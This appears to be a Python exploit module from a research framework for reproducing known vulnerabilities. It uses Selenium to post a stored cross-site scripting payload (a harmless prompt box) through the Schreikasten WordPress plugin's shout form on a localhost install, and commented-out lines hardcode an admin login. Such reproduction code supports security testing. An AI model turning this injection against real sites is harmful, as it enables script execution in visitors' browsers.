import framework                                                                                                                                                               
import time                                                                                                                                                                                  
class Exploit (framework.Exploit):                                                                                                                                                
                                                                                                                                                                                  
    attributes = {'Name' : "OSVDB_83152",                                                                                                                                
                  'Description' : "Creates a post containing a XSS payload.",                                                                                                     
                  'References' : [['OSVDB','83152'],['http://www.osvdb.org/show/osvdb/83152']],                                                                                
                  'Target' : "Wordpress 3.2",                                                                                                                              
                  'TargetLicense' : '',                                                                                                                                           
                  'Type' : "XSS",                                                                                                                                          
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-83152",
                  'Plugin' : "Schreikasten 0.14.13"                                                                                  
                  }                                                                                                                                                               
                                                                                                                                                                                  
    def __init__(self, visible=False):                                                                                                                                            
        framework.Exploit.__init__(self, visible)                                                                                                                                 
        return                                                                                                                                                                    
                                                                                                                                                                                  
    def exploit(self):                                                                                                                                                            
                                                                                                                                                                                  
        payload = "<script>prompt(\"Attack!!\")</script>"                                                                                                                                                       
                                                                                                                                                                                  
        driver = self.create_selenium_driver()                                                                                                                                    
                                                                                                                                                                                  
        driver.get("http://localhost/wordpress")                                                                                                                             
        self.logger.info("Page opened successfully: %s", driver.title)                                                                                                            
        self.logger.info("uploading payload: %s", payload)  

        #driver.get("http://localhost/wordpress/wp-login.php")
        #driver.find_element_by_id("user_login").clear()                                                                                                                                
        #driver.find_element_by_id("user_login").send_keys("wpadmin")                                                                                                                                                                                                                 
        #driver.find_element_by_id("user_pass").clear()                                                                                                                              
        #driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        #driver.find_element_by_id("wp-submit").click() 

        #driver.get("http://localhost/wordpress/wp-admin/themes.php")
        #driver.get("http://localhost/wordpress/wp-admin/widgets.php")  

        #element = driver.find_element_by_id("_____")
        #target = driver.find_element_by_id("sidebar-1")
        #ActionChains(driver).drag_and_drop(element, target).perform() 

        #driver.find_element_by_id("user_info_arrow").click()
        #driver.get("http://localhost/wordpress/wp-login.php?action=logout&_wpnonce=0e8c26c0fe")                                                                                                                 
        
        driver.get_element(by_xpath="//input[contains(@id,'sk_alias')]").clear() 
        driver.get_element(by_xpath="//input[contains(@id,'sk_alias')]").send_keys("John Doe") 
        driver.get_element(by_xpath="//input[contains(@id,'sk_email')]").clear() 
        driver.get_element(by_xpath="//input[contains(@id,'sk_email')]").send_keys("johndoe@aol.com") 
        driver.get_element(by_xpath="//*[contains(@id,'sk_text')]").clear() 
        driver.get_element(by_xpath="//*[contains(@id,'sk_text')]").send_keys(payload)
        driver.get_element(by_xpath="//*[contains(@id,'sk_button')]").send_keys("\n")
        driver.get_element(by_class="sk-userdata-user")
        time.sleep(10)
        driver.cleanup()
        return

